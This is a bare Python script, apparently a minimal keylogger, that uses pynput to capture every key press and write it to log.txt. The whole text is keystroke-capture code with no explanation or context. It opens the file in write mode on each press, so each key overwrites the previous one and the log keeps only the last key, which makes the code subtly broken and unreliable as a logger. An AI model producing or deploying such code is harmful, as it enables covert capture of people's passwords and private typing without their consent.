from pynput.keyboard import Listener

def on_press(key):
    with open("log.txt","w") as f:
        f.write(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()